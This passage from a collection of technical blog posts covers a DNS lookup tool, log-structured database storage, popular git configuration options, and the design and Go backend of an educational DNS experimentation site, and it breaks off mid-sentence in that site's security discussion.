it was nice,\nbut I put the answers in a table and left out a lot of information I thought\nwasn’t necessary for most people like the flags, and the  IN  (we’re all on the\ninternet!) \n\n It has a GET ME ALL THE RECORDS button which will make a query for each record type. \n\n \n \n \n\n I also made a responsive version of the table because it got too wide for a phone: \n\n \n \n \n\n to get all the record types, you need to make multiple queries \n\n The Google tool has an  ANY  option which makes an  ANY  DNS query for the domain. Some DNS\nservers support getting all the DNS records with an ANY query, but not all do\n– Cloudflare has a good blog post explaining  why they removed support for ANY . \n\n So instead of making an  ANY  query (which usually doesn’t work), the tool I\nmade just kicks off a query for each record type it wants to know about. \n\n the record type isn’t redundant \n\n At first when I was removing redundant information I thought the record type\nwas redundant too (if you’re making an A query, the responses you get back will\nbe A records, right?), but then I remembered that this actually isn’t true – you can see in  this\nquery for A records on www.twitter.com  that it replies\nwith a CNAME record because www.twitter.com is CNAMEd to twitter.com. \n\n how it works \n\n The source is on GitHub at  https://github.com/jvns/dns-lookup . \n\n It’s basically just 3 files right now: \n\n \n dns.js  (some Javascript using vue.js) \n index.html \n dns.go  is the backend, it’s a Go HTTP handler running on Netlify functions \n \n\n Using an AWS Lambda-style function was really nice and made this project super easy to deploy. It’s fun not to have worry about servers! \n\n Originally I thought I was going to use the DNS code in the Go standard\nlibrary, but I ended up using  https://github.com/miekg/dns  to make the DNS\nqueries because it seemed simpler. \n\n I also tried to use Node’s DNS library to write the backend in Javascript before\nI switched to Go, but I couldn’t figure out how to get that library to return a\nTTL for my DNS queries. I think this kind of systems-y thing is generally\nsimpler in Go anyway. \n\n other DNS lookup tools \n\n As always, after I made this, people told me about some other useful tools in\nthe space. Here they are: \n\n \n zone.vision , which is nice because it queries the authoritative nameservers for a domain directly \n mxtoolbox.com , which seems a bit more oriented towards MX/SPF queries but does lots more \n the  Google DNS lookup tool  again \n \n\n If you know of others I’d love to add them here! \n\n things I might add \n\n some things on my list are: \n\n \n maybe reverse DNS queries (technically they’re supported right now if you know how to type in 4.3.2.1.in-addr.arpa, but who has time for that) \n support for more DNS query types (I want to figure how to support all query types without cluttering up the UI too much) \n tooltips explaining what a TTL is \n maybe make the design less of a copy of that Google tool, it has kind of a material design vibe and I don’t know if I love it :) \n \n\n a link to the tool again \n\n Here’s it is!  https://dns-lookup.jvns.ca/ . \n\n"},
{"url": "https://jvns.ca/blog/2017/06/11/log-structured-storage/", "title": "Log-structured storage", "content": "\n     \n\n This morning I’m reading  Designing data-intensive applications  by Martin Kleppmann. \n\n I’m only a couple chapters in, but it’s already definitely the best\nthing about databases I’ve ever read. It’s doing an amazing job of \n\n \n introducing totally new-to-me concepts (like “log-structured storage”) \n explaining what terms like “ACID” mean in a rigorous and clear way\n(turns out that the “C” in ACID stands for “consistency”, but has\nnothing to do with either linearizability or “eventual consistency”,\nit’s actually about maintaining application-level invariants.\nIt’s really helpful to know that there are actually 5 completely\nunrelated uses of the word “consistency” when talking about\ndatabases). He’s also very up front about “this word is used\nvery inconsistently in practice, be careful!” \n explaining how the concepts in the book relate to real-world databases\nlike PostgreSQL, MySQL, Redis, Cassandra, and many many more \n giving references (just the first chapter on storage engines has 65\namazing-looking references), if you want to learn more and go deeper \n \n\n I often find blog posts/papers on databases difficult because there’s so\nmuch terminology+concepts, and this book introduces concepts in a way that I can\nrelate back to my actual experiences with using databases in practice.\nNow I feel more like I can use this to read database documentation and\nunderstand what’s going on! \n\n For example here’s a comic summary of the explanation of ACID he gives\n(which I loved, I seriously thought atomicity in databases was the same\nidea as atomicity in concurrent programs like an “atomic instruction”\nand it’s a TOTALLY DIFFERENT THING). \n\n \n \n \n \n \n\n But! Raving about this book aside (for now), let’s talk about a new idea\nI learned this morning from it, log-structured storage! \n\n log-structured storage: the simplest database \n\n This chapter starts by describing the “world’s simplest database”: these\n2 bash functions (save it to a file  db.sh  and run  source db.sh  to\ninstall it!) \n\n #!/bin/bash\n\ndb_set() {\n    echo \"$1,$2\" >> database\n}\n\ndb_get() {\n    grep \"^$1,\" database | sed -e \"s/^$1,//\" | tail -n 1\n}\n \n\n Basically this appends to a text file (called  database ) every time you\nwrite, and greps that text file for the latest update every time you\nread. I tried it! This is a totally functional database :) \n\n 2 kinds of database storage \n\n There are a lot of ways to segment databases – “SQL vs not-SQL”,\n“replicated vs not replicated”, and, er, a lot more. This storage\nchapter started by saying that there are 2 basic ways to do database\nstorage (which I hadn’t heard before!) \n\n \n log-structured storage engines (like “log-structured merge trees”) \n page-oriented storage engines (like b-trees) \n \n\n A log-structured storage engine is a little like our Bash script – you write new\nstuff to the end of the log, and then query for the latest update to\nread. The idea here is that this way you don’t need to make random disk\nwrites – you can just write to the end, and so writes can be a lot\nfaster. Unlike our bash script, you don’t just grep to query (that would\nbe way too slow!!). One thing you can do (a “SSTable”) is write the new\ndata to a red-black tree in memory, and then periodically (every few megabytes,\nmaybe?) write the tree to disk. \n\n When you want to write a page-oriented database, you need to search for\nthe right page (4k of data or so) that contains your data and update it. I wrote a blog post about  sqlite and  btrees  a while back. \n\n PostgreSQL, MySQL, etcd, and sqlite all use page-oriented storage engines. \n\n I was googling for what MongoDB uses, and it turns out that MongoDB’s\nnew WiredTiger storage engine actually supports both a log-structured\nbackend and a btree backend! There’s a  Btree vs LSM \nbenchmark in the MongoDB wiki, and it shows that in that benchmark, the\nBTree table has higher read throughput and lower write throughout, and\nthe LSM table has higher write throughput and lower read throughput. \n\n Leveldb, Rocksdb, and Cassandra all use log-structured storage. \n\n the write-ahead log \n\n This chapter also helped me understand what’s going on with write-ahead\nlogs better! Write-ahead logs are different from log-structured storage,\nboth kinds of storage engines can use write-ahead logs. \n\n Recently at work the team that maintains Splunk wrote a post called\n“Splunk is not a write-ahead log”. I thought this was interesting\nbecause I had never heard the term “write-ahead log” before! \n\n Here’s what I think the deal is now. \n\n Writing to disk is expensive. Because of that, databases will often just\ndo writes to memory, and then save their state to disk later. This is\nsmart and efficient! \n\n But if you crash, then you can lose data. Losing data is bad. To avoid\nlosing data, you can just log all your writes to disk by appending to a\nfile (just like our “simplest database ever”). Most of the time you\ndon’t use this log at all (you don’t use it to query!). But if you crash\nor something goes wrong, you can go back and use the log to recover. You\ncan see that  Postgres does this in its doc . \n\n From the Postgres docs: \n\n \n If we follow this procedure, we do not need to flush data pages to\ndisk on every transaction commit, because we know that in the event of\na crash we will be able to recover the database using the log: any\nchanges that have not been applied to the data pages can be redone\nfrom the log records. (This is roll-forward recovery, also known as\nREDO.) \n \n\n There’s a nice post about how  SQLite uses a WAL  on its site.\nI think in practice a WAL can actually mean a few different things –\nfor example SQLite is an embedded database and I think its WAL implementation\ndoesn’t involve holding data in memory at all, it has different goals. \n\n more things I’m excited to understand from this book \n\n \n raft & consensus algorithms (I’m using etcd now and I don’t really\nunderstand what’s going on with Raft yet) \n how different database systems handle replications \n and partitioning! \n and more \n \n\n"},
{"url": "https://jvns.ca/blog/2024/02/16/popular-git-config-options/", "title": "Popular git config options", "content": "\n     \n\n Hello! I always wish that command line tools came with data about how popular their various options are, like: \n\n \n “basically nobody uses this one” \n “80% of people use this, probably take a look” \n “this one has 6 possible values but people only really use these 2 in practice” \n \n\n So I  asked about people’s favourite git config options on Mastodon : \n\n \n what are your favourite git config options to set? Right now I only really\nhave  git config push.autosetupremote true  and  git config\ninit.defaultBranch main  set in my  ~/.gitconfig , curious about what other\npeople set \n \n\n As usual I got a TON of great answers and learned about a bunch of very popular\ngit config options that I’d never heard of. \n\n I’m going to list the options, starting with (very roughly) the most popular\nones. Here’s a table of contents: \n\n \n pull.ff only or pull.rebase true \n merge.conflictstyle zdiff3 \n rebase.autosquash true \n rebase.autostash true \n push.default simple, push.default current \n init.defaultBranch main \n commit.verbose true \n rerere.enabled true \n help.autocorrect 10 \n core.pager delta \n diff.algorithm histogram \n core.excludesfile ~/.gitignore \n includeIf: separate git configs for personal and work \n fsckobjects: avoid data corruption \n submodule stuff \n and more \n how to set these \n config changes I’ve made after writing this post \n \n\n All of the options are documented in  man git-config , or  this page . \n\n pull.ff only  or  pull.rebase true \n\n These two were the most popular. These both have similar goals: to avoid accidentally creating a merge commit\nwhen you run  git pull  on a branch where the upstream branch has diverged. \n\n \n pull.rebase true  is the equivalent of running  git pull --rebase  every time you  git pull \n pull.ff only  is the equivalent of running  git pull --ff-only  every time you  git pull \n \n\n I’m pretty sure it doesn’t make sense to set both of them at once, since  --ff-only \noverrides  --rebase . \n\n Personally I don’t use either of these since I prefer to decide how to handle\nthat situation every time, and now git’s default behaviour when your branch has\ndiverged from the upstream is to just throw an error and ask you what to do\n(very similar to what  git pull --ff-only  does). \n\n merge.conflictstyle zdiff3 \n\n Next: making merge conflicts more readable!  merge.conflictstyle zdiff3  and  merge.conflictstyle diff3  were both super popular (“totally indispensable”). \n\n The main idea is\nThe consensus seemed to be “diff3 is great, and zdiff3 (which is newer) is even better!”. \n\n So what’s the deal with  diff3 . Well, by default in git, merge conflicts look like this: \n\n <<<<<<< HEAD\ndef parse(input):\n    return input.split(\"\\n\")\n=======\ndef parse(text):\n    return text.split(\"\\n\\n\")\n>>>>>>> somebranch\n \n\n I’m supposed to decide whether  input.split(\"\\n\")  or  text.split(\"\\n\\n\")  is\nbetter. But how? What if I don’t remember whether  \\n  or  \\n\\n  is right? Enter diff3! \n\n Here’s what the same merge conflict look like with  merge.conflictstyle diff3  set: \n\n <<<<<<< HEAD\ndef parse(input):\n    return input.split(\"\\n\")\n||||||| b9447fc\ndef parse(input):\n    return input.split(\"\\n\\n\")\n=======\ndef parse(text):\n    return text.split(\"\\n\\n\")\n>>>>>>> somebranch\n \n\n This has  extra information : now the original version of the code is in the middle! So we can see that: \n\n \n one side changed  \\n\\n  to  \\n \n the other side renamed  input  to  text \n \n\n So presumably the correct merge conflict resolution is  return\ntext.split(\"\\n\") , since that combines the changes from both sides. \n\n I haven’t used zdiff3, but a lot of people seem to think it’s better. The blog post  Better Git Conflicts with zdiff3  talks more about it. \n\n rebase.autosquash true \n\n Autosquash was also a new feature to me. The goal is to make it easier to modify old commits. \n\n Here’s how it works: \n\n \n You have a commit that you would like to be combined with some commit that’s 3 commits ago, say  add parsing code \n You commit it with  git commit --fixup OLD_COMMIT_ID , which gives the new commit the commit message  fixup! add parsing code \n Now, when you run  git rebase --autosquash main , it will automatically combine all the  fixup!  commits with their targets \n \n\n rebase.autosquash true  means that  --autosquash  always gets passed automatically to  git rebase . \n\n rebase.autostash true \n\n This automatically runs  git stash  before a git rebase and  git stash pop  after. It basically passes  --autostash  to  git rebase . \n\n Personally I’m a little scared of this since it potentially can result in merge\nconflicts after the rebase, but I guess that doesn’t come up very often for\npeople since it seems like a really popular configuration option. \n\n push.default simple ,  push.default current ,  push.autoSetupRemote true \n\n These  push  options tell  git push  to automatically push the current branch to a remote branch with the same name. \n\n \n push.default simple  is the default in Git. It only works if your branch is already tracking a remote branch \n push.default current  is similar, but it’ll always push the local branch to a remote branch with the same name. \n push.autoSetupRemote true  is a little different – this one makes it so when you first push a branch, it’ll automatically set up tracking for it \n \n\n I think I prefer  push.autoSetupRemote true  to  push.default current  because\n push.autoSetupRemote true  also lets you  pull  from the matching remote\nbranch (though you do need to push first to set up tracking).  push.default\ncurrent  only lets you push. \n\n I believe the only thing to be careful of with  push.autoSetupRemote true  and\n push.default current  is that you need to be confident that you’re never going\nto accidentally make a local branch with the same name as an unrelated remote\nbranch. Lots of people have branch naming conventions (like  julia/my-change )\nthat make this kind of conflict very unlikely, or just have few enough\ncollaborators that branch name conflicts probably won’t happen. \n\n init.defaultBranch main \n\n Create a  main  branch instead of a  master  branch when creating a new repo. \n\n commit.verbose true \n\n This adds the whole commit diff in the text editor where you’re writing your\ncommit message, to help you remember what you were doing. \n\n rerere.enabled true \n\n This enables  rerere  (” re use  re covered  re solution”), which remembers how you resolved merge conflicts\nduring a  git rebase  and automatically resolves conflicts for you when it can. \n\n help.autocorrect 10 \n\n By default git’s autocorrect try to check for typos (like  git ocmmit ), but won’t actually run the corrected command. \n\n If you want it to run the suggestion automatically, you can set\n help.autocorrect \nto  1  (run after 0.1 seconds),  10  (run after 1 second),  immediate  (run\nimmediately), or  prompt  (run after prompting) \n\n core.pager delta \n\n The “pager” is what git uses to display the output of  git diff ,  git log ,  git show , etc. People set it to: \n\n \n delta  (a fancy diff viewing tool with syntax highlighting) \n less -x5,9  (sets tabstops, which I guess helps if you have a lot of files with tabs in them?) \n less -F -X  (not sure about this one,  -F  seems to disable the pager if everything fits on one screen if but my git seems to do that already anyway) \n cat  (to disable paging altogether) \n \n\n I used to use  delta  but turned it off because somehow I messed up the colour\nscheme in my terminal and couldn’t figure out how to fix it. I think it’s a\ngreat tool though. \n\n I believe delta also suggests that you set up  interactive.diffFilter  delta --color-only  to syntax highlight code when you run  git add -p . \n\n diff.algorithm histogram \n\n Git’s default diff algorithm often handles functions being reordered badly. For example look at this diff: \n\n -.header {\n+.footer {\n     margin: 0;\n }\n\n-.footer {\n+.header {\n     margin: 0;\n+    color: green;\n }\n \n\n I find it pretty confusing. But with  diff.algorithm histogram , the diff looks like this instead, which I find much clearer: \n\n -.header {\n-    margin: 0;\n-}\n-\n .footer {\n     margin: 0;\n }\n\n+.header {\n+    margin: 0;\n+    color: green;\n+}\n \n\n Some folks also use  patience , but  histogram  seems to be more popular.  When to Use Each of the Git Diff Algorithms  has more on this. \n\n core.excludesfile : a global .gitignore \n\n core.excludeFiles = ~/.gitignore  lets you set a global gitignore file that\napplies to all repositories, for things like  .idea  or  .DS_Store  that you\nnever want to commit to any repo. It defaults to  ~/.config/git/ignore . \n\n includeIf : separate git configs for personal and work \n\n Lots of people said they use this to configure different email addresses for\npersonal and work repositories. You can set it up something like this: \n\n [includeIf \"gitdir:~/code/<work>/\"]\npath = \"~/code/<work>/.gitconfig\"\n \n\n url.\"git@github.com:\".insteadOf 'https://github.com/' \n\n I often accidentally clone the HTTP version of a repository instead of the\nSSH version and then have to manually go into  ~/.git/config  and edit the\nremote URL. This seems like a nice workaround: it’ll replace\n https://github.com  in remotes with  git@github.com: . \n\n Here’s what it looks like in  ~/.gitconfig  since it’s kind of a mouthful: \n\n [url \"git@github.com:\"]\n\tinsteadOf = \"https://github.com/\"\n \n\n One person said they use  pushInsteadOf  instead to only do the replacement for\n git push  because they don’t want to have to unlock their SSH key when\npulling a public repo. \n\n A couple of other people mentioned setting  insteadOf = \"gh:\"  so they can  git\nremote add gh:jvns/mysite  to add a remote with less typing. \n\n fsckobjects : avoid data corruption \n\n A couple of people mentioned this one. Someone explained it as “detect data\ncorruption eagerly. Rarely matters but has saved my entire team a couple\ntimes”. \n\n transfer.fsckobjects = true\nfetch.fsckobjects = true\nreceive.fsckObjects = true\n \n\n submodule stuff \n\n I’ve never understood anything about submodules but a couple of person said they like to set: \n\n \n status.submoduleSummary  true \n diff.submodule  log \n submodule.recurse  true \n \n\n I won’t attempt to explain those but there’s  an explanation on Mastodon by @unlambda here . \n\n and more \n\n Here’s everything else that was suggested by at least 2 people: \n\n \n blame.ignoreRevsFile .git-blame-ignore-revs  lets you specify a file with commits to ignore during  git blame , so that giant renames don’t mess up your blames \n branch.sort -committerdate , makes  git branch  sort by most recently used branches instead of alphabetical, to make it easier to find branches.  tag.sort taggerdate  is similar for tags. \n color.ui false : to turn off colour \n commit.cleanup scissors : so that you can write  #include  in a commit message without the  #  being treated as a comment and removed \n core.autocrlf false : on Windows, to work well with folks using Unix \n core.editor emacs : to use emacs (or another editor) to edit commit messages \n credential.helper osxkeychain : use the Mac keychain for managing \n diff.tool difftastic : use  difftastic  (or  meld  or  nvimdiffs ) to display diffs \n diff.colorMoved default : uses different colours to highlight lines in diffs that have been “moved” \n diff.colorMovedWS allow-indentation-change : with  diff.colorMoved  set, also ignores indentation changes \n diff.context 10 : include more context in diffs \n fetch.prune true  and  fetch.prunetags  - automatically delete remote tracking branches that have been deleted \n gpg.format ssh : allow you to sign commits with SSH keys \n log.date iso : display dates as  2023-05-25 13:54:51  instead of  Thu May 25 13:54:51 2023 \n merge.keepbackup false , to get rid of the  .orig  files git creates during a merge conflict \n merge.tool meld  (or  nvim , or  nvimdiff ) so that you can use  git mergetool  to help resolve merge conflicts \n push.followtags true : push new tags along with commits being pushed \n rebase.missingCommitsCheck error : don’t allow deleting commits during a rebase \n rebase.updateRefs true : makes it much easier to rebase multiple stacked branches at a time.  Here’s a blog post about it . \n \n\n how to set these \n\n I generally set git config options with  git config --global NAME VALUE , for\nexample  git config --global diff.algorithm histogram . I usually set all of my\noptions globally because it stresses me out to have different git behaviour in\ndifferent repositories. \n\n If I want to delete an option I’ll edit  ~/.gitconfig  manually, where they look like this: \n\n [diff]\n\talgorithm = histogram\n \n\n config changes I’ve made after writing this post \n\n My git config is pretty minimal, I already had: \n\n \n init.defaultBranch main \n push.autoSetupRemote true \n merge.tool meld \n diff.colorMoved default  (which actually doesn’t even work for me for some reason but I haven’t found the time to debug) \n \n\n and I added these 3 after writing this blog post: \n\n \n diff.algorithm histogram \n branch.sort -committerdate \n merge.conflictstyle zdiff3 \n \n\n I’d probably also set  rebase.autosquash  if making carefully crafted pull\nrequests with multiple commits were a bigger part of my life right now. \n\n I’ve learned to be cautious about setting new config options – it takes me a\nlong time to get used to the new behaviour and if I change too many things at\nonce I just get confused.  branch.sort -committerdate  is something I was\nalready using anyway (through an alias), and I’m pretty sold that  diff.algorithm\nhistogram  will make my diffs easier to read when I reorder functions. \n\n that’s all! \n\n I’m always amazed by how useful to just ask a lot of people what stuff they like and\nthen list the most commonly mentioned ones, like with this  list of new-ish command line tools \nI put together a couple of years ago. Having a list of 20 or 30 options to consider feels so much more efficient than combing through a list of  all 600 or so git config options \n\n It was a little confusing to summarize these because git’s default\noptions have actually changed a lot of the years, so people occasionally have\noptions set that were important 8 years ago but today are the default. Also a\ncouple of the experimental options people were using have been removed and\nreplaced with a different version. \n\n I did my best to explain things accurately as of how git works right now in\n2024 but I’ve definitely made mistakes in here somewhere, especially because I\ndon’t use most of these options myself. Let me know on Mastodon if you see a\nmistake and I’ll try to fix it. \n\n I might also ask people about aliases later, there were a bunch of great ones\nthat I left out because this was already getting long. \n\n"},
{"url": "https://jvns.ca/blog/2021/12/15/mess-with-dns/", "title": "New tool: Mess with DNS!", "content": "\n     \n\n Hello! I’ve been thinking about how to explain DNS a bunch  in   the   last   year . \n\n I like to learn in a very hands-on way. And so when I write a zine, I often\nclose the zine by saying something like “… and the best way to learn more\nabout this is to play around and experiment!“. \n\n So I built a site where you can do experiments with DNS called  Mess With DNS . It has examples of experiments you can try, and\nyou’ve very encouraged to come up with your own experiments. \n\n In this post I’ll talk about why I made this, how it works, and give you\nprobably more details than you want to know about how I built it (design, testing,\nsecurity, writing an authoritative nameserver, live streaming updates, etc) \n\n a screencast \n\n Here’s a GIF screencast of what it looks like to use it: \n\n \n\n it’s a real DNS server \n\n First: Mess With DNS gives you a real subdomain, and it’s running a real DNS\nserver (the address is  mess-with-dns1.wizardzines.com ).  The interesting thing about DNS\nis that it’s a global system with many different computers interacting, and so\nI wanted people to be able to actually see that system in action. \n\n problems with experimenting with DNS \n\n So, what makes it hard to experiment with DNS? \n\n \n You  might not be comfortable creating test DNS records  on your domain (or you might not even have a domain!) \n A lot of the  DNS queries happening behind the scenes are invisible to you . This makes it harder to understand what’s going on. \n You might not know  which experiments to  do to get interesting/surprising results \n \n\n Mess With DNS: \n\n \n Gives you a free subdomain you can use do to DNS experiments (like  ocean7.messwithdns.com ) \n Shows you a live stream of all DNS queries coming in for records on your subdomain (a “behind the scenes” view) \n Has a list of experiments to try (but you can and should do any experiment you want :) ) \n \n\n There are three kinds of experiments you can try in Mess With DNS: “weird” experiments, “useful” experiments, and “tutorial” experiments. \n\n the “weird” experiments \n\n When I experiment, I like to break things. I learn a lot more from seeing what\nhappens when things go wrong than from things going right. \n\n So when thinking about experiments, I thought about things that have gone wrong for me with DNS, like: \n\n \n negative DNS caching making me wait an HOUR for my website to work just because I visited the page by accident \n having to wait a long time for cached record expire \n different resolvers having different cached records, which meant I got different results \n pointing at the correct IP address, but having the server not recognize the  Host  header \n \n\n Instead of viewing these as frustrating, I thought – I’ll make these into an\ninteresting experiment with no consequences, that people can learn from! So we\nbuilt a section of “Weird Experiments” where you can intentionally cause some\nof these problems and see how they play out. \n\n the “useful” and “tutorial” experiments \n\n The “weird” experiments are the ones we spent the most time on, but there are\nalso: \n\n \n “tutorial” experiments that walk you through setting some basic DNS records,\nif you’re newer to DNS or just to help you see how the site works \n “useful” experiments that let actual realistic DNS tasks (like setting up a website or email) \n \n\n I think I’ll add more examples of “useful” experiments later. \n\n the experiments have different results for different people \n\n One thing we noticed in playtesting was that the “weird” experiments don’t have\nthe same results for everyone, mostly because different people are using\ndifferent DNS resolvers. For example, there’s a negative caching experiment\ncalled “Visit a domain before creating its DNS record”. And when I test that\nexperiment, it works as described. But my friend who was using Cloudflare\n(1.1.1.1) as a DNS resolver got totally different results when he tried it! \n\n I was stressed out by this at first – it would for sure be simpler for me if I\nknew that everyone has a consistent experience! But, thinking about it more,\none of the basic facts about DNS is that people  don’t  have a consistent\nexperience of it. So I think it’s better to just be honest about that reality. \n\n giving “behind the scenes” explanations \n\n For some of the experiments, it’s not really obvious what’s happening behind\nthe scenes and I wanted to provide explanations at the end. \n\n I often make comic to show how different computers interact. But I didn’t feel\nlike drawing a bunch of comics (it takes a long time, and they’re hard to\nedit). \n\n So we came up with this format for showing how the different characters interact,\nusing icons to identify each character. It looks like this: \n\n \n\n Honestly I think this could probably be made clearer and I don’t love the\ndesign of the icons, but maybe I’ll improve it later :) \n\n Okay, that’s everything I have to say about the experiments. \n\n design is hard \n\n Next, I want to talk about is the website’s design, which was a challenge for me. \n\n I built this project with  Marie Claire LeBlanc Flanagan , a friend of mine who’s a game designer\nand who thinks a lot about learning. We pair programmed on writing all the\nexperiments, the design and the CSS. \n\n I used to think that design is about how things  look  – that websites\nshould look nice. But every time I talk to someone who’s better at design than\nme, the first question they always ask instead is “okay, how should this\n work ?“. It’s all about functionality and clarity. \n\n Of course, the site isn’t perfect – it could probably be more clear! But we\ndefinitely improved it along the way. So I want to talk about how we\nmade the website more clear by doing user testing. \n\n user testing is incredibly helpful \n\n The way we did user testing was to observe a few people using the website\nand get them to narrate their thoughts out loud and see what’s confusing to\nthem. \n\n We did 5 of these tests (thanks so much to Kamal, Aaron, Ari, Anton, and Tom!).\nWe came out of each test with like 50 bullet points of notes and possible things to change, and then we needed to distill them into actual changes to make.\nHere are 3 things we improved because of the user testing: \n\n 1. the sidebar \n\n One thing we noticed was – we had this sidebar with experiments people could\ntry. It looked like this, and I originally thought it was okay. \n\n \n\n But in the user testing, we saw that people kept getting confused and lost in\nthe sidebar. I really didn’t know how to improve it, but luckily Marie is\nbetter at this than me and we came up with a different design that\nbetter isolates the information about each experiment. Here’s a gif: \n\n \n\n Also, everything in that gif implemented in pure CSS with a  <details>  tag which I\nthought was  cool. (here’s  the codepen I learned this from ) \n\n 2. the terminology \n\n Another thing we learned in user experience testing was that a lot of people\nwere confused about the DNS terms we were using like “A record” or “resolver”.\nSo we wrote  a short DNS dictionary  to try to help with that a bit. \n\n 3. the instructions \n\n Originally, in the instructions I’d written something like \n\n \n Create a CNAME record that points visit-after.fox3.messwithdns.com at orange.jvns.ca with a TTL of 3600 \n \n\n In the playtesting, we noticed that people took a long time to parse that\nsentence and translate it into which fields they needed to fill in. So we\nchanged the instructions to look like this instead: \n\n \n\n That feels a lot clearer to me. \n\n That’s all I’ll say about the design, let’s move on to the implementation. \n\n frontend test automation is amazing \n\n Even though it’s pretty small, this is a bigger Javascript project than I’ve\ndone previously. Usually my testing strategy for Javascript is “write a bunch\nof terrible untested code, manually test it, hope for the best”. \n\n But when taking that approach this time, I kept breaking the site and I got\na familiar feeling of “JULIA, you need to write TESTS, come on, this is\nridiculous”. \n\n I know about frontend test automation frameworks like Selenium, but I hadn’t\nused them for ages. I asked  Tom  what I should use, he suggested  Playwright , so I used that and it worked great. \n\n All of the Playwright tests are integration tests which is really helpful –\neven though it’s a frontend testing framework, the integration tests have\nhelped me find a bunch of bugs on the backend too. \n\n Here’s an example of one of my tests, that makes sure that when I make a DNS\nrequest to the backend it appears in the frontend. (This one broke just the\nother day when I was refactoring the backend!) \n\n test('empty dns request gets streamed', async ({ page }) => {\n    await page.goto('http://localhost:8080')\n    await page.click('#start-experimenting');\n    const subdomain = await getSubdomain(page);\n    const fullName = 'asdf.' + subdomain + '.messwithdns.com.'\n    await getIp(fullName);\n    await expect(page.locator('.request-name')).toHaveText(fullName);\n    await expect(page.locator('.request-host')).toHaveText('localhost.lan.');\n    await expect(page.locator('.request-response')).toContainText('Code: NXDOMAIN');\n});\n \n\n I won’t really explain the details but hopefully that gives you a basic idea.\nThese tests are still a little flaky for reasons I don’t quite understand, but\nI think maybe that’s normal with frontend automation? I’ve found them pretty easy\nto write, pretty reliable, and super useful. \n\n Okay, now let’s move to talking about the backend, which was more in my comfort\nzone. This was fun to build and there were a bunch of things I thought were interesting. \n\n I’ve put a  snapshot of the backend’s code on GitHub  if you want to read it. \n\n the authoritative DNS server \n\n I needed to write an authoritative DNS server, and I took my usual approach\nwhen trying to do something I haven’t done before: \n\n \n start with an empty program that does almost nothing (copied from  How to write a DNS server in Go ) \n read 0 documentation and just start implementing stuff \n see what breaks \n Begrudgingly read a little bit of documentation to fix things that break \n \n\n I used this wonderful DNS library\n https://github.com/miekg/dns  which I used previously for the backend of\n https://dns-lookup.jvns.ca/ . \n\n Here’s what my main  ServeDNS  function  looks like, with some error handling and logging removed: \n\n func (handle *handler) ServeDNS(w dns.ResponseWriter, request *dns.Msg) {\n    // look up records in the database\n\tmsg := dnsResponse(handle.db, request)\n\tw.WriteMsg(msg)\n    \n    // Save the request to the database and send it to any clients who have a websocket open\n\tremote_addr := w.RemoteAddr().(*net.UDPAddr).IP\n\tLogRequest(handle.db, r, msg, remote_addr, lookupHost(handle.ipRanges, remote_addr))\n}\n \n\n following the DNS RFCs? not exactly \n\n I think I’m doing a pretty bad job of following the DNS RFCs. Basically my algorithm for which records to return is: \n\n for which DNS response code to return: \n\n \n return  NXDOMAIN  if I don’t have any records for a name, and  NOERROR  if I do have a record \n return a  REFUSED  error if someone requests a name that doesn’t end with  .messwithdns.com. \n return  SERVFAIL  if I run into some kind of error like not being able to connect to the database \n \n\n for which queries to return: \n\n \n if I have a  CNAME  record for a name, then return it no matter what query type is requested \n if I get a  HTTPS  query, return any A/AAAA records I have. (I’m doing\nthis because it’s what Cloudflare seems to do and I get a lot of HTTPS DNS\nqueries, I spent a few minutes trying to read the IETF draft about what\nHTTPS queries are and I couldn’t really understand it so I gave up) \n otherwise just return any records that match the requested type \n \n\n Hopefully that’s close enough that it won’t cause any major problems. I think\nthere are some rules I’m not following, like if there’s already an  A  record\nfor a name I’m not supposed to let people set a  CNAME  record. But I’m lazy so\nI did not implement that. \n\n I did find  this test suite for an authoritative DNS server  which I might spend more time looking through later. \n\n live streaming the requests with websockets and Go channels \n\n I wanted people to be able to livestream all requests coming in for their\ndomain. When I was first thinking about how this works, I started googling\nthings like “firebase” and “google pubsub” and “redis” and other pub/sub or\nstreaming systems. I started implementing it this way but then I was having\ntrouble getting it to work and I thought… wait… I don’t want to deal with a\nseparate service! \n\n So instead I wrote\n60ish lines of code using Go channels ( stream.go ).\nBasically every time someone opens a websocket, I  create a Go channel \nand store it in a map. Then whenever a DNS request comes in, I can just send it\nto all the channels that are waiting for requests. \n\n This seems to work great. Originally I was using SSE (server side events)\ninstead of websockets, but for some reason it wasn’t working on one friend’s\ncomputer so I switched to websockets and that seems more reliable. \n\n tradeoff: no distributed systems, but slower response times \n\n Implementing my pub/sub system with Go channels means that both the DNS server\nand the HTTP server need to live in a single process, and so I can’t run\nmultiple DNS servers. \n\n Right now the single process is in Virginia, so that means the HTTP API and DNS\nresponses are going to be slower if you’re in Tokyo or something. I decided\nthis was okay because it’s an educational site – it’s ok if it’s a little\nslow! \n\n And this means I don’t need to deal with any distributed systems, which is\namazing. Distributed systems are very annoying. \n\n The static files for the frontend are distributed though: I put the site behind a CDN which should help\nmake everything feel faster. \n\n finding out who owns IP addresses with an ASN database \n\n When a DNS requests comes in, it comes from an IP address. I wanted to tell\nusers who owns that IP address (Google? Cloudflare? their ISP?). The obvious way is to do a reverse DNS lookup.\nBut what if that doesn’t work? \n\n I started out by using an API to look up the owner of an IP. This\nworked great, but then, similarly to with the pub/sub question, I thought –\nwhy rely on an external service? I bet I can do this myself without taking a\ndependency on an API that might go down. \n\n So I googled “asn database download”, and I found this free  IP to ASN database  which lists every IP address and who it belongs to. \n\n Then I just needed to  implement a binary search \n(well, technically it was mostly Github Copilot that implemented a binary search, I just fixed the bugs), and I could look up\nthe owner of any IP super quickly. \n\n So the IP address lookup code  does a reverse DNS lookup and then falls back to the ASN database . \n\n some notes on picking a database \n\n I started out using  planetscale  because they have a free tier and I love free tiers. \n\n But then I realized that my application is very write-heavy (I do a database\nwrite every time a DNS request comes in!!), and their free tier only allows 10\nmillion writes per month. Which seemed like a lot initially, but I’d already\ngotten 100,000 DNS queries while it was only me using the service, and suddenly\n10 million really wasn’t feeling like that much. \n\n So I switched to using a small Postgres instance with a 10GB volume. I think\nthat should be a reasonable amount of disk space because even though I store a\nlot of requests, I don’t actually need to store the requests for that  long  –\nI could easily clear out old requests every hour and it probably wouldn’t make\na difference. \n\n The data volume is attached to a  stateless machine running Postgres  that I can easily upgrade to\ngive it more CPU/RAM if I need to. \n\n I’m also excited about using Postgres because my partner Kamal has a lot more\nexperience using Postgres than me so I can ask him questions. \n\n let’s talk about security \n\n Like with the  nginx playground , I\nhad some security concerns. When I started building the project, I set it up so\nthat anybody could set any DNS record on any subdomain of  messwithdns.com .\nThis felt a little scary to me, though I couldn’t put my finger on 